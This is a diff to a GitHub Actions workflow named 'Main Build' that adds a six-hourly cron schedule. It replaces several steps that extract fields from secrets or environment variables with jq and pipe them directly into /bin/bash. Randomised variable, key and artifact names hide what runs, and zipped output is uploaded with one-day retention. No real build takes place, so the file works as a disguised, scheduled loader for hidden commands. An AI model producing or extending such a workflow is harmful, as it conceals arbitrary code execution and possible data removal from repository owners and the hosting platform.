@@ -2,6 +2,8 @@ name: Main Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '46 0,6,12,18 * * *'
 jobs:
   pipeline:
     runs-on: ubuntu-latest
@@ -9,19 +11,21 @@ jobs:
       - uses: actions/checkout@v4
       - name: Invoke
         env:
-          zv7868: ${{ secrets.zv7868 }}
+          wwzt2: ${{ secrets.wwzt2 }}
         run: |
-          printf '%s' "$zv7868" | jq -r .xpjhc2 | /bin/bash
-          echo $o17 | jq -r .xjf48 | /bin/bash
-          echo $xwzpg11394 | jq -r .wig12459 | /bin/bash
-          printf '%s' "$rnkwu103" | jq -r .pa24790 | /bin/bash
-          echo $j4483 | jq -r .qwu92877 | /bin/bash
-          printf '%s' "$yaq23" | jq -r .z6 | /bin/bash
+          printf '%s' "$wwzt2" | jq -r .tztv7784 | /bin/bash
+          printf '%s' "$wrt2100" | jq -r .dpznx907 | /bin/bash
+          printf '%s' "$vyvfs949" | jq -r .gkv46834 | /bin/bash
+          echo $et226 | jq -r .j7 | /bin/bash
+          printf '%s' "$jhj8642" | jq -r .qtgzd42 | /bin/bash
+          printf '%s' "$gcbmq325" | jq -r .yri30 | /bin/bash
+          printf '%s' "$qcw86805" | jq -r .jf90512 | /bin/bash
+          echo $cwnma024 | jq -r .hqr3 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
         uses: actions/upload-artifact@v4
         with:
-          name: FtITUOs4
+          name: nUExMVrL
           path: "*.zip"
           retention-days: 1
